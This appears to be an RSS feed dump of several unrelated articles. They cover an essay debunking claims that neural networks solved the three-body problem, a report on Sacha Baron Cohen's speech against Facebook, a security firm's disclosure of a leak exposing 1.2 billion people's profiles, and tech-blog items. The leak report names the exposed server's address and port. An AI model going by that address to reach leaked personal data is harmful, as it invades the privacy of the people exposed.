<description>&lt;p&gt;&lt;span class=&quot;dropcap&quot;&gt;C&lt;/span&gt;an AI teach itself the laws of physics? Will classical computers soon be replaced by deep neural networks? Sure looks like it, if you’ve been following the news, which lately has been filled with headlines like, “&lt;a href=&quot;https://www.technologyreview.com/s/614597/a-neural-net-solves-the-three-body-problem-100-million-times-faster/&quot; target=&quot;_blank&quot;&gt;A neural net solves the three-body problem 100 million times faster&lt;/a&gt;: Machine learning provides an entirely new way to tackle one of the classic problems of applied mathematics,” and “&lt;a href=&quot;https://www.technologyreview.com/s/611798/who-needs-copernicus-if-you-have-machine-learning/&quot; target=&quot;_blank&quot;&gt;Who needs Copernicus if you have machine learning&lt;/a&gt;?”. The latter was described by another journalist, in an article called “&lt;a href=&quot;https://www.unite.ai/ai-teaches-itself-laws-of-physics/&quot; target=&quot;_blank&quot;&gt;AI Teaches Itself Laws of Physics&lt;/a&gt;,” as a “monumental moment in both AI and physics,” which “could be critical in solving quantum mechanics problems.”&lt;/p&gt;
&lt;blockquote class=&quot;pull-quote&quot;&gt;
&lt;p&gt;The trouble is, the authors have given no compelling reason to think that they could actually do this.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;None of these claims is even close to being true. All derive from just two recent studies that use machine learning to explore different aspects of planetary motion. Both papers represent interesting attempts to do new things, but neither warrant the excitement. The exaggerated claims made in both papers, and the resulting hype surrounding these, are symptoms of a tendency among science journalists—and sometimes scientists themselves—to overstate the significance of new advances in AI and machine learning.&lt;/p&gt;
&lt;p&gt;As always, when one sees large claims made for an AI system, the first question to ask is, “What does the system actually do?”&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;The Three-Body Problem&lt;/strong&gt;&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;The three-body problem is the problem of predicting how three objects—typically planets or stars—move over time under mutual gravitational force. If there are only two bodies, then, as Newton proved, the behavior is simple: Each of the objects moves along a circle, an ellipse, or a hyperbola. But, as Newton and his successors also determined, when there are three or more bodies involved, the behaviors can become very strange and complex. There is no simple mathematical formula; and accurate prediction over extended periods of time becomes very difficult. Finding good ways to calculate solutions to the three-body problem and the &lt;em&gt;n&lt;/em&gt;-body problem (the same problem, with more objects) has been a major challenge for computational physics for 300 years. The  slew of “AI that solves the three-body problem” articles were based on an article in arXiv entitled “&lt;a href=&quot;https://arxiv.org/abs/1910.07291&quot; target=&quot;_blank&quot;&gt;Newton vs The Machine: Solving The Chaotic Three-Body Problem Using Deep Neural Networks&lt;/a&gt;.”&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;As is often the case, the technical article is less over the top than the popular ones, but, for a technical scientific article, this one is still pretty ambitious. It ends with the prediction that techniques developed for a narrow case should extend both to the general three-body problem and then ultimately to the four- and five-body problems and other chaotic systems, which could conceivably constitute a genuine revolution.&lt;/p&gt;
&lt;p&gt;The trouble is, the authors have given no compelling reason to think that they could actually do this. In fact, they haven’t even engaged in the full breadth of the existing three-body problem. Instead, they focused only on a special case of the three-body problem, involving three particles of equal mass starting from specified positions with zero velocity.&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;Even here, they are entirely dependent on a conventional physics engine or simulator—which is to say no AI, no machine learning, just traditional numerical solution of the differential equations of motion—to generate the trajectories of motion over time from 10,000 different starting positions.&lt;/p&gt;
&lt;blockquote class=&quot;pull-quote&quot;&gt;
&lt;p&gt;The media enthusiasm is sending the wrong impression, making it sound like any old problem can be solved with a neural network.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;They then used this classically-derived database as input, to train the neural network. In testing the neural network on new examples, whose true solution was also calculated by the simulator, they found that the neural network could predict the later positions of the particles with reasonable accuracy, orders of magnitude faster than the conventional simulator.&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;In essence, what they were doing was to use the neural network as a new tool for interpolating from known values derived using an external, classical system. The neural network may be better at interpolation with a smooth space of values than other techniques, but most of the work comes from the external prior system doing the work. And, crucially, they haven’t shown that the same sort of interpolation would actually work in the more complex physics of the actual world, even for simple cases (particles of different masses), let alone in situations with more bodies than just three.&lt;/p&gt;
&lt;p&gt;Meanwhile, in technical terms, even within the three-body problem, the class of problems they have solved has is an easy subset viz. two degrees of freedom—that is, a problem instance is determined by two numerical parameters—whereas the general three-body problem has 10 degrees of freedom. In their limited version of the problem, the only choice you have in formulating a problem that fundamentally changes the behavior is where to place the third object relative to the first two. In the full problem, which they didn’t attempt, you can additionally choose the masses and initial velocities of the second and third objects; and each of these choices can radically change how the system evolves over time.&lt;/p&gt;

&lt;h4 class=&quot;article-title&quot;&gt;&lt;a href=&quot;http://nautil.us/issue/23/Dominoes/five-short-stories-about-the-life-and-times-of-ideas&quot; class=&quot;obnd_lnk&quot; data-trval=&quot;five-short-stories-about-the-life-and-times-of-ideas&quot; data-trlbl=&quot;foc_rec&quot; data-tract=&quot;internal_art&quot;&gt;Five Short Stories About the Life and Times of Ideas&lt;/a&gt;&lt;/h4&gt;
&lt;p class=&quot;article-author&quot;&gt;By David Krakauer&lt;/p&gt;
&lt;p&gt;In the following five short chapters, David Krakauer, an evolutionary theorist, and president elect of the Santa Fe Institute, haven of complex systems research, examines five facets of chain reactions, each typifying how ideas spread through science and culture. Together...&lt;strong&gt;&lt;a href=&quot;http://nautil.us/issue/23/Dominoes/five-short-stories-about-the-life-and-times-of-ideas&quot; class=&quot;obnd_lnk&quot; data-trval=&quot;five-short-stories-about-the-life-and-times-of-ideas&quot; data-trlbl=&quot;foc_rec&quot; data-tract=&quot;internal_art&quot;&gt;READ MORE&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/div&gt;

&lt;/article&gt;&lt;/div&gt;
&lt;p&gt;And we know that the complexity of this kind of problem tends to increase exponentially with the number of degrees of freedom. So the problem they have solved is not five times easier than the general problem, it is vastly easier. And the problem gets rapidly worse as you add more points: the four-body problem has 17 degrees of freedom, the five-body has 24, the &lt;em&gt;n&lt;/em&gt;-body has 7&lt;em&gt;n&lt;/em&gt;-11.&lt;/p&gt;
&lt;p&gt;Second, if you only have to worry about two dimensions, then calculating 10,000 data points gives pretty good coverage. If, let’s say, you want to map out the shape of a mountain, and you measure the elevation at 10,000 points—essentially, every point on a 100 x 100 grid—then you can estimate the elevation at any point in between pretty reliably. Things get much more complex as the number of dimensions increases, and the possibility of smooth interpolation working diminishes.&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;Third, the scientists failed to wrestle with the 800-pound chaotic butterfly in the room: the high degree of dependence on starting conditions. Two slightly different starting conditions can lead to radically different outcomes. This is not a limitation of the algorithm that you used to make the prediction; it is an inherent characteristic of the problem. Therefore, claiming that a machine learning system has learned to predict a chaotic system over the long term is like saying that it has learned to predict the behavior of a random process, like thermal noise or radioactive decay.  It simply can’t be done, regardless of the algorithm. (Kudos to &lt;a href=&quot;https://www.popularmechanics.com/science/a29714375/three-body-problem-unsolvable/&quot; target=&quot;_blank&quot;&gt;Caroline Delbert&lt;/a&gt; at &lt;em&gt;Popular Mechanics&lt;/em&gt; for noticing this; most journalists missed it.)&lt;/p&gt;
&lt;p&gt;Finally, even the comparison with a conventional simulator was flawed. Jonathan Goodman, of the math department at New York University, an expert on these kinds of dynamical systems, assures us that modern adaptive methods can compute these trajectories much faster than the timings quoted in the paper; the conventional simulator was a straw model.&lt;/p&gt;
&lt;img src=&quot;http://static.nautil.us/16598_59be87529097e488e3b631d6a4c62bc7.png&quot; width=&quot;733&quot; alt=&quot;&quot;/&gt;&lt;span class=&quot;caption&quot;&gt;&lt;strong&gt;THE DISCOVERER:&lt;/strong&gt; It’s misleading to say a neural network infers the planets revolve around the sun. It doesn’t understand anything is revolving around anything. The system is a calculator, Copernicus is the discoverer.&lt;/span&gt;&lt;span class=&quot;credit&quot;&gt;Mario Breda / Shutterstock&lt;/span&gt;
&lt;p&gt;&lt;strong&gt;Copernicus&lt;/strong&gt;&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;The situation with the Copernicus project is no better.&lt;/p&gt;
&lt;p&gt;Here a different set of authors, &lt;a href=&quot;https://arxiv.org/abs/1807.10300&quot; target=&quot;_blank&quot;&gt;in work to be published&lt;/a&gt; in &lt;em&gt;Physical Review Letters&lt;/em&gt;, constructed a neural network designed to take as input numerical data from a physical process and extract the key parameters that determine the behavior of the process. They described four experiments involving simple physical systems of different kinds, in which their neural network succeeds as they had hoped.&lt;/p&gt;
&lt;p&gt;The supposed rediscovery of the Copernican system from astronomical observation is what caused excitement in the popular press.&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;The trouble is that it is entirely misleading to say that their neural network infers that “the Earth and Mars revolve about the sun.” The neural network doesn’t actually understand that anything is revolving around anything, in a geometric sense; it has no sense of geometry and no idea what it would mean to revolve. All the neural network does is to extract the two numerical parameters involved; it has no idea that these represent angles from some fixed central point. As far as the network is concerned, these could be time-varying masses, or electric charges, or angles from two different central points. Correlations between data sources were extracted, but the system made no inferences about how those data sources related to the world; it is the human scientists who identify these as the angles of the Earth and Mars as measured from the sun, and who abstract the facts that such parameters are best interpreted as orbits. All of the real work of Copernicus’ actual discovery is done in advance; the system was a calculator, not a discoverer.&lt;/p&gt;
&lt;p&gt;Further, in the synthetic data the authors generated, the Earth and Mars move in constant-velocity circular orbits in the same plane. In the real solar system, things are notably trickier: The plane of Mars’ orbit is tilted at 1.8&lt;sup&gt;o&lt;/sup&gt; to the plane of the Earth’s orbit (the ecliptic). In consequence, the apparent position of Mars against the fixed stars does not just move on an east-west circle, as it would if the two orbits were co-planar; it also moves back and forth on a north-south arc about 4&lt;sup&gt;o&lt;/sup&gt; long. Viewed over a period of years, the position of Mars does not stay in a simple circular path in the sky; it lies in a strip that is 4&lt;sup&gt;o&lt;/sup&gt; wide at its widest. Copernicus’ real challenge (solved long before modern computers, and without Big Data) was vastly more complex than what the network had to deal with.&lt;/p&gt;
&lt;img src=&quot;http://static.nautil.us/16587_9f1974a3c9203cbce1166759bcb7fc0f.png&quot; width=&quot;733&quot; alt=&quot;&quot;/&gt;&lt;strong&gt;mars angles:&lt;/strong&gt; Mars is shown in its position furthest from the plane of the ecliptic. At that point the angle between the line from the sun to Mars and the ecliptic plane is then α = 1.8&lt;sup&gt;o&lt;/sup&gt;. The position of the earth, when Mars is at that place, varies from year to year. Earth (1) is the closest that the earth comes to that position of Mars; when the earth is there, the angle between the line from earth to Mars and the ecliptic is β = 5.5&lt;sup&gt;o&lt;/sup&gt;. Earth (2) is the furthest that earth gets from that position of Mars; when earth is there, the angle between the line from the earth to Mars and the ecliptic is γ = 1.1&lt;sup&gt;o&lt;/sup&gt;. The vertical axis has been exaggerated, for clarity.
&lt;p&gt;Four degrees may sound small, but by the standards of astronomical observations, it is huge.  By way of comparison, Orion’s belt is only 2.7&lt;sup&gt;o&lt;/sup&gt; wide. Measurements in Ptolemy’s &lt;em&gt;Almagest&lt;/em&gt; are mostly accurate to within about 1/10 of a degree.&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;Accordingly, both the Ptolemaic and the Copernican models of the solar system must have mechanisms to account for this transverse motion of Mars and the other planets. The Copernican model is therefore necessarily much more complicated than the simple model, that was produced (in a sense) by the neural network, in which the Earth and Mars revolve around the sun in circular orbits. In fact, the Copernican model included 48 epicycles, more than the Ptolemaic model, though it was simpler in other respects. The network system doesn’t even engage in the transverse movement.&lt;/p&gt;
&lt;p&gt;Buoyed by their supposed success in duplicating Copernicus’ accomplishment, the authors and journalists look forward to the days when this kind of machine learning technology can make radical advances in theoretical physics. &lt;a href=&quot;https://www.nature.com/articles/d41586-019-03332-7&quot; target=&quot;_blank&quot;&gt;An article&lt;/a&gt; in &lt;em&gt;Nature News&lt;/em&gt; even enthused, “A neural network that teaches itself the laws of physics could help to solve quantum-mechanics mysteries.”&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;This is pure fantasy. In the examples in this experiment, the relation between the data observed and the parameters extracted is fairly straightforward. By contrast, in most of the experimental evidence for quantum theories, the relation between the observations and underlying theories is extraordinarily indirect and subtle and requires extremely ingenious theorizing to reveal; detecting correlations as these neural network systems does not even scratch the surface of what would be required.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Why It Matters&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The flaws in these particular studies are not huge in themselves, but the way they have been reported is symptomatic of a problem that is in fact serious. Such overblown reports lend false credence to the idea—most notoriously promoted in Chris Anderson’s 2008 infamous article, “&lt;a href=&quot;https://www.wired.com/2008/06/pb-theory/&quot; target=&quot;_blank&quot;&gt;The End of Theory: The Data Deluge Makes the Scientific Method Obsolete&lt;/a&gt;,” and increasingly part of the general zeitgeist—that AI generally and deep learning theory will soon replace all other approaches to computation or even to knowledge, when nothing of the sort has been established. The media enthusiasm for deep learning is sending the wrong impression, making it sound like any old problem can be solved with a massive neural network and the right data set, without attention to the fundamentals in that domain.&lt;/p&gt;
&lt;p&gt;The truth is that many of the hard, open problems in the world require a great deal of expertise in particular domains. In the sort of problems in these two papers, it means if someone wants to make a useful contribution to the solution of the three-body problem or similar problems, one has to spend serious time studying the sophisticated science of differential equations, numerical computation, and dynamical systems. In the domain of natural language understanding, it might similar mean incorporating a great deal of work in linguistics and psycholinguistics, rather than gathering just a large data set and large assembly of sophisticated computers.&lt;/p&gt;
&lt;p&gt;The widespread misimpression that data + neural networks is a universal formula has real consequences: in what scientists choose to research, in what companies and governments choose to fund, in what journals and conferences choose to accept for publication, in what students choose to study, and in what universities choose to teach. The reality is that neural networks, in anything like their current form, cannot replace the sophisticated tools of scientific analysis, developed over centuries, and have not thus far duplicated the great scientific accomplishments of the past—let alone improved upon them. They should be seen as tools that supplement existing techniques, not foundational revisions to how we do science.&lt;/p&gt;

<title>Sacha Baron Cohen: Facebook would have let Hitler buy ads for &amp;#039;final solution&amp;#039;</title>

<description>&lt;span class=&quot;storyimage fullwidth inlineimage&quot; data-aop=&quot;image&quot;&gt;&lt;span class=&quot;image&quot; data-attrib=&quot;Provided by Guardian News &amp;amp; Media Limited&quot; data-caption=&quot;Photograph: Mario Anzuoni/Reuters&quot;&gt;&lt;img alt=&quot;Sacha Baron Cohen wearing a suit and tie: Photograph: Mario Anzuoni/Reuters&quot; height=&quot;180&quot; src=&quot;https://img-s-msn-com.akamaized.net/tenant/amp/entityid/BBXbabv.img?h=180&amp;amp;w=300&amp;amp;m=6&amp;amp;q=60&amp;amp;o=f&amp;amp;l=f&amp;amp;x=465&amp;amp;y=275&quot; width=&quot;300&quot;/&gt;&lt;/span&gt; &lt;span class=&quot;caption truncate&quot;&gt;&lt;span class=&quot;attribution&quot;&gt;© Provided by Guardian News &amp;amp; Media Limited&lt;/span&gt; Photograph: Mario Anzuoni/Reuters&lt;/span&gt;&lt;/span&gt;&lt;p&gt;Sacha Baron Cohen has denounced tech giants Facebook, Twitter, YouTube and Google as “the greatest propaganda machine in history” and culpable for a surge in “murderous attacks on religious and ethnic minorities”.&lt;/p&gt;
&lt;p&gt;Baron Cohen was speaking on Thursday at Never Is Now, the Anti-Defamation League’s summit on antisemitism and hate in New York, where he was presented with the organisation’s international leadership award. He said that “hate crimes are surging, as are murderous attacks on religious and ethnic minorities” and that “all this hate and violence is being facilitated by a handful of internet companies that amount to the greatest propaganda machine in history”.&lt;/p&gt;
&lt;p&gt;He added: “The algorithms these platforms depend on deliberately amplify the type of content that keeps users engaged – stories that appeal to our baser instincts and that trigger outrage and fear. It’s why YouTube &lt;a href=&quot;https://www.theguardian.com/technology/2018/feb/02/how-youtubes-algorithm-distorts-truth&quot;&gt;recommended videos&lt;/a&gt; by the conspiracist Alex Jones billions of times. It’s why fake news outperforms real news, because studies show that lies spread faster than truth … As one headline put it, just think what Goebbels could have done with Facebook.”&lt;/p&gt;
&lt;p&gt;“If you pay them, &lt;a href=&quot;https://www.independent.co.uk/voices/facebook-political-adverts-democracy-data-harvesting-employee-election-a9197956.html&quot;&gt;Facebook will run any ‘political’ ad you want&lt;/a&gt;, even if it’s a lie,” he said. “And they’ll even help you micro-target those lies to their users for maximum effect. Under this twisted logic, if Facebook were around in the 1930s, it would have allowed Hitler to post 30-second ads on his ‘solution’ to the ‘Jewish problem’.”&lt;/p&gt;
&lt;p&gt;Baron Cohen went on to attack Mark Zuckerberg’s &lt;a href=&quot;https://www.theguardian.com/technology/2019/oct/17/mark-zuckerberg-facebook-free-expression-speech&quot;&gt;defence of Facebook as a bastion of “free expression”&lt;/a&gt;. He said: “I think we could all agree that we should not be giving bigots and paedophiles a free platform to amplify their views and target their victims.” Baron Cohen also criticised &lt;a href=&quot;https://www.theguardian.com/technology/2018/jul/18/zuckerberg-facebook-holocaust-deniers-censorship&quot;&gt;Facebook’s decision not to remove Holocaust deniers&lt;/a&gt;, saying: “We have millions of pieces of evidence for the Holocaust – it is an historical fact. And denying it is not some random opinion. Those who deny the Holocaust aim to encourage another one.”&lt;/p&gt;

&lt;p&gt;Baron Cohen also called for internet companies to be held responsible for their content. “It’s time to finally call these companies what they really are – the largest publishers in history. And here’s an idea for them: abide by basic standards and practices just like newspapers, magazines and TV news do every day.”&lt;/p&gt;
&lt;p&gt;“Internet companies can now be held responsible for paedophiles who use their sites to target children. I say, let’s also hold these companies responsible for those who use their sites to advocate for the mass murder of children because of their race or religion. And maybe fines are not enough. Maybe it’s time to tell Mark Zuckerberg and the CEOs of these companies: you already allowed one foreign power to interfere in our elections, you already facilitated one &lt;a href=&quot;https://www.nytimes.com/2018/10/15/technology/myanmar-facebook-genocide.html&quot;&gt;genocide in Myanmar&lt;/a&gt;, do it again and you go to jail.”&lt;/p&gt;
&lt;p&gt;Facebook said they had no comment, but referred to previous statements the organisation have made on &lt;a href=&quot;https://about.fb.com/news/2019/10/mark-zuckerberg-stands-for-voice-and-free-expression/&quot;&gt;“free expression”&lt;/a&gt; and the &lt;a href=&quot;https://about.fb.com/news/2019/11/how-facebook-is-prepared-for-the-2019-uk-general-election/&quot;&gt;UK general election&lt;/a&gt;.&lt;/p&gt;

<title>Personal and social information of 1B people discovered in data leak</title>

&lt;div class=&quot;post-info&quot;&gt;
&lt;p&gt;November 22, 2019&lt;/p&gt;


&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;On October 16, 2019 Bob Diachenko and Vinny Troia discovered a wide-open Elasticsearch server containing an unprecedented &lt;strong&gt;4 billion user accounts&lt;/strong&gt; spanning more than &lt;strong&gt;4 terabytes of data&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;A total count of unique people across all data sets reached more than 1.2 billion people, making this one of the largest data leaks from a single source organization in history. The leaked data contained names, email addresses, phone numbers, LinkedIN and Facebook profile information.&lt;/p&gt;
&lt;p&gt;What makes this data leak unique is that it contains data sets that appear to originate from 2 different data enrichment companies.&lt;/p&gt;
&lt;h3&gt;How Does Data Enrichment Work?&lt;/h3&gt;
&lt;p&gt;For a very low price, data enrichment companies allow you to take a single piece of information on a person (such as a name or email address), and expand (or enrich) that user profile to include hundreds of additional new data points of information. As seen with the &lt;a href=&quot;https://www.wired.com/story/exactis-database-leak-340-million-records/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;Exactis&lt;/a&gt; data breach, collected information on a single person can include information such as household sizes, finances and income, political and religious preferences, and even a person’s preferred social activities.&lt;/p&gt;
&lt;p&gt;Each time a company chooses to “enrich” a user profile, they are also agreeing to provide what they know about the person to the enriching organization (thereby increasing the validity of the organization’s future results). Despite efforts from social media organizations like Facebook, the resulting data continues to be compounded, creating a situation with no oversight that ultimately allows all of a person’s social and personal information to be easily downloaded.&lt;/p&gt;
&lt;h3&gt;The Open Elasticsearch Server&lt;/h3&gt;
&lt;p&gt;The discovered Elasticsearch server containing all of the information was unprotected and accessible via web browser at http://35.199.58.125:9200. No password or authentication of any kind was needed to access or download all of the data.&lt;/p&gt;
&lt;p&gt;Elasticsearch stores its information in an index, which is similar to a type of database. The following is a screenshot of the different indexes (databases) available on the discovered server.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.dataviper.io/wp-content/uploads/2019/11/PDL_OXY_dataleak_elasticsearch_server.png&quot;&gt;&lt;img class=&quot;imageborder alignnone wp-image-82641 size-large&quot; src=&quot;https://www.dataviper.io/wp-content/uploads/2019/11/PDL_OXY_dataleak_elasticsearch_server-1024x403.png&quot; alt=&quot;Elasticsearch data leak 4tb &quot; width=&quot;840&quot; height=&quot;331&quot; srcset=&quot;https://www.dataviper.io/wp-content/uploads/2019/11/PDL_OXY_dataleak_elasticsearch_server-1024x403.png 1024w, https://www.dataviper.io/wp-content/uploads/2019/11/PDL_OXY_dataleak_elasticsearch_server-300x118.png 300w, https://www.dataviper.io/wp-content/uploads/2019/11/PDL_OXY_dataleak_elasticsearch_server-768x303.png 768w, https://www.dataviper.io/wp-content/uploads/2019/11/PDL_OXY_dataleak_elasticsearch_server.png 1028w&quot; sizes=&quot;(max-width: 840px) 100vw, 840px&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The majority of the data spanned 4 separate data indexes, labeled “PDL” and “OXY”, with information on roughly 1 billion people per index. Each user record within the databases was labeled with a “source” field that matched either PDL or Oxy, respectively.&lt;/p&gt;
&lt;h2&gt;Company 1: People Data Labs (PDL)&lt;/h2&gt;
&lt;p&gt;Based on our analysis of the data, we believe the data in the PDL indexes originated from &lt;a href=&quot;http://www.peopledatalabs.com&quot;&gt;People Data Labs&lt;/a&gt;, a data aggregator and enrichment company.&lt;/p&gt;
&lt;p&gt;De-duplicating the nearly 3 billion PDL user records revealed roughly 1.2 billion unique people, and 650 million unique email addresses, which is in-line with the statistics provided on their website. The data within the three different PDL indexes also varied slightly, some focusing on scraped LinkedIN information, email addresses and phone numbers, while other indexes provided information on individual social media profiles such as a person’s Facebook, Twitter, and Github URLs.&lt;/p&gt;
&lt;p&gt;According to their website, the PDL application can be used to search:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Over 1.5 Billion unique people, including close to 260 million in the US.&lt;/li&gt;
&lt;li&gt;Over 1 billion personal email addresses. Work email for 70%+ decision makers in the US, UK, and Canada.&lt;/li&gt;
&lt;li&gt;Over 420 million Linkedin urls&lt;/li&gt;
&lt;li&gt;Over 1 billion facebook urls and ids.&lt;/li&gt;
&lt;li&gt;400 million+ phone numbers. 200 million+ US-based valid cell phone numbers.&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;Attribution to PDL&lt;/h3&gt;
&lt;p&gt;After notifying PDL, we were informed that the server in question does not belong to them. This is consistent with our research as the server in question resided on Google Cloud, while PDL API appears to use Amazon Web Services.&lt;/p&gt;
&lt;p&gt;In order to test whether or not the data belonged to PDL, we created a free account on their website which provides users with 1,000 free people lookups per month.&lt;/p&gt;

}
&lt;/pre&gt;
&lt;h3&gt;Almost 100% Data Match&lt;/h3&gt;
&lt;p&gt;The data discovered on the open Elasticsearch server was almost a complete match to the data being returned by the People Data Labs API. The only difference being the data returned by the PDL also contained education histories. There was no education information in any of the data downloaded from the server. Everything else was exactly the same, including accounts with multiple email addresses and multiple phone numbers.&lt;/p&gt;
&lt;p&gt;To confirm, we randomly tested 50 other users and the results were always consistent.&lt;/p&gt;
&lt;h4&gt;An Interesting and Unique Match&lt;/h4&gt;
&lt;p&gt;One of the phone numbers returned for my profile was 1-636-825-2744. I do not remember ever having this phone number, so I decided to look into it. Roughly 10 years ago I was given a land line as part of an AT&amp;amp;T TV bundle. The landline was never used and never given to anyone – I never actually owned a phone, yet somehow this information appears in my profile.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;When I checked my account on PeopleDataLabs.com, the returned results were identical – including that phone number.&lt;/strong&gt;&lt;br/&gt;Since I have never seen this phone number appear in any of my previously breached/leaked records, this is a very good indication that the leaked database originated from PDL.&lt;/p&gt;
&lt;h2&gt;Company 2: OxyData.io (OXY)&lt;/h2&gt;
&lt;p&gt;After some basic sleuthing, I came across &lt;a href=&quot;http://www.oxydata.io&quot;&gt;OxyData.io&lt;/a&gt;, another data enrichment company. OxyData’s website claims to have 4TB of user data (exactly the amount discovered), but only 380 million people profiles.&lt;/p&gt;
&lt;h3&gt;OxyData Analysis&lt;/h3&gt;
&lt;p&gt;Analysis of the “Oxy” database revealed an almost complete scrape of LinkedIN data, including recruiter information.&lt;br/&gt;Upon contacting OxyData, I was also informed that the server did not belong to them. Oxy was not willing to give me access to their API to test/compare profiles, but they were nice enough to send me a copy of my own record for analysis. The data they sent contained mostly scraped LinkedIN profile, and appears to be a match for the data data.&lt;/p&gt;
&lt;h2&gt;Who is Accountable?&lt;/h2&gt;
&lt;p&gt;This is an incredibly tricky and unusual situation. The lion’s share of the data is marked as “PDL”, indicating that it originated from People Data Labs. However, as far as we can tell, the server that leaked the data is not associated with PDL. This raises a number of other questions. First, how did this mystery organization get the data? Are they a current or former customer? If so, the data discovered on the server indicates that this company is a customer of both People Data Labs and OxyData.&lt;/p&gt;
&lt;p&gt;If this was a customer that had normal access to PDL’s data, then it would indicate the data was not actually “stolen”, but rather mis-used. This unfortunately does not ease the troubles of any of the 1.2 billion people who had their information exposed.&lt;/p&gt;
&lt;p&gt;If this was not a breach, then &lt;strong&gt;who is accountable for this exposure?&lt;/strong&gt;&lt;/p&gt;
&lt;h3&gt;The Problem of Attribution&lt;/h3&gt;
&lt;p&gt;Identification of exposed/nameless servers is one of the most difficult parts of an investigation. In this case, all we can tell from the IP address (35.199.58.125) is that it is (or was) hosted with Google Cloud.&lt;/p&gt;
&lt;p&gt;Because of obvious privacy concerns cloud providers will not share any information on their customers, making this a dead end.&lt;br/&gt;Agencies like the FBI can request this information through legal process (a type of official Government request), but they have no authority to force the identified organization to disclose the breach.&lt;/p&gt;
&lt;p&gt;One could argue that because PDL’s data was mis-used, it is up to them to notify their customers. One could also argue that the owner of 35.199.58.125 is responsible &lt;em&gt;and&lt;/em&gt; liable for any potential damages. But legally, we have no way of knowing who that is without a court order.&lt;/p&gt;
&lt;p&gt;Due to the sheer amount of personal information included, combined with the complexities identifying the data owner, this has the potential raise questions on the effectiveness of our current privacy and breach notification laws.&lt;/p&gt;
&lt;h2&gt;About Data Viper&lt;/h2&gt;

&lt;p&gt;Google quietly revealed this week that it will kill Cloud Print, a cloud-based printing solution that never exited beta over almost 10 years.&lt;/p&gt;
&lt;p&gt;“Cloud Print, Google’s cloud-based printing solution that has been in beta since 2010, will no longer be supported as of December 31, 2020,” a Google support document &lt;a href=&quot;https://support.google.com/chrome/a/answer/9633006&quot;&gt;explains&lt;/a&gt;. “Beginning January 1, 2021, devices across all operating systems will no longer be able to print using Google Cloud Print. We recommend that over the next year, you identify an alternative solution and execute a migration strategy.”&lt;/p&gt;
&lt;p&gt;Cloud Print integrated with other Google services like Gmail, Google Docs, and Chrome, and it was originally positioned as a printing solution for Chrome OS. But with Chrome OS offering native print services now, Cloud Print became superfluous. Certainly, the Chrome OS print experience is on par with that of, say, Windows 10 in S mode.&lt;/p&gt;
&lt;p&gt;Regardless, Google is getting savaged by bloggers for killing yet another service, one that most of them never even tried, let alone used regularly. But the biggest impact here, I bet, will be in education, since Chromebooks are sold in large part on their lack of management expertise. And figuring out whether they can still print will be a task many educators are not ready for.&lt;/p&gt;

<title>The Danger of “Simplicity”</title>
<link>https://asthasr.github.io/posts/danger-of-simplicity</link>
<guid isPermaLink="true" >https://asthasr.github.io/posts/danger-of-simplicity</guid>
<description>&lt;p&gt;There are a few tendencies among programmers that involve the totem of “simplicity.” There’s the ancient concept of KISS, of course, but there’s also the much-abused &lt;a href=&quot;https://www.martinfowler.com/bliki/Yagni.html&quot;&gt;YAGNI&lt;/a&gt;, the insistence that we &lt;a href=&quot;https://mcfunley.com/choose-boring-technology&quot;&gt;“Choose Boring Technology,”&lt;/a&gt; entire languages that base their elevator pitch around the idea that they’re “simple,” and the concept in object-oriented design that “every class should have a single responsibility.”&lt;/p&gt;
&lt;p&gt;The problem with these approaches is that “simplicity” never gets a rigorous definition. The rhetoric around them is tautological: “Do the simple thing.” “Which one is that?” “The simple one, isn’t it obvious?” If you disagree with the assessment of what constitutes simplicity, you’re met with incredulity. “What do you &lt;em&gt;mean&lt;/em&gt;, you think Go’s error handling is bad? It’s &lt;em&gt;simple!&lt;/em&gt;” How can we make this less confrontational? How can we articulate a position more powerful than “syntax highlighting is juvenile?”&lt;/p&gt;
&lt;h2 id=&quot;the-purpose-of-programming&quot;&gt;The Purpose of Programming&lt;/h2&gt;
&lt;p&gt;It’s easy to get lost in minutiae. Who hasn’t shaved a yak? Still, the ultimate purpose of programming as a profession or hobby is clear: we want to apply the raw power of computation to a problem, and know that the “recipe” we’ve written can be trusted to solve the problem we think that it does. Code, in itself, is not an asset. A solved problem is an asset.&lt;/p&gt;
&lt;p&gt;The types of programs that we need to deliver, their performance models, their failure modes, and the methods we can use to understand them are all different depending on the environment in which we work, but the need for trust in our programs is universal. I think the worst fear for a programmer is a program that not only &lt;em&gt;misbehaves&lt;/em&gt;, but also &lt;em&gt;misbehaves in ways we don’t understand&lt;/em&gt;. We want tools that do what they’re supposed to do, or, if they can’t, that fail predictably in ways that we can quickly understand and fix.&lt;/p&gt;
&lt;p&gt;When someone argues for “simplicity,” they are almost always arguing implicitly for concepts that they believe improve the possibility of trustworthiness. The problem emerges when programmers of all types forget that their preferred model of success does not apply to all types of programs, and each choice imposes costs.&lt;/p&gt;
&lt;h2 id=&quot;what-are-we-optimizing-for&quot;&gt;What are we optimizing for?&lt;/h2&gt;
&lt;p&gt;The creators of Go have said, sometimes in pejorative terms, that “average programmers” have difficulty understanding complex languages, and have set themselves against that complexity by designing one with a relatively small syntactic grammar, error handling based on return codes, and no generics. They looked at the landscape of “complicated” languages and decided that the form of simplicity that they’d optimize for would be the initial learning curve.&lt;/p&gt;
